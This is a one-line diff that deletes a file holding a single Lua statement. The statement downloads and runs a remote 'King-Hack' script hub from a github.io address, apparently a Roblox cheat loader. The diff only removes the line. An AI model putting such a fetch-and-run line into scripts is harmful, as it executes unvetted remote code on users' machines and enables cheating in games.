@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://sinnyno1.github.io/King-Hack/Script/ScriptHub.lua"))();
